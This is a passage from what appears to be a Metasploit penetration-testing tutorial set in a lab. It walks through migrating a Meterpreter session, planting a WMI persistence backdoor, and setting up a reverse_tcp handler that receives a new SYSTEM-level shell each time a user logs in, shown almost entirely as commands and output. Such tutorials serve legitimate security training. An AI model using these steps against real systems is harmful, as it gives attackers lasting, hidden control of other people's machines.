```
Server username: NT AUTHORITY\SYSTEM
meterpreter > migrate -N explorer.exe
[*] Migrating from 5700 to 4624...
[*] Migration completed successfully.
meterpreter > getuid
Server username: VAGRANT-2008R2\vagrant
meterpreter > background
[*] Backgrounding session 1...
msf exploit(wmi_persistence) > exploit
...
[*] Clean up Meterpreter RC file:
/root/.msf4/logs/wmi_persistence/192.168.216.10_20171029.5446/
192.168.216.10_20171029.5446.rc
msf exploit(wmi_persistence) >
```

12. Then, we will set up our listener, using the Generic Payload Handler module so that the next time the user logs in to the machine, we will get a new session using our WMI backdoor:

```
msf exploit(handler) > set PAYLOAD
windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 4445
LPORT => 4445
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > exploit -j
[*] Exploit running as background job 1.
...

msf exploit(handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

By logging off and logging in as the administrator user on the target machine, we were able to verify that the backdoor works as expected.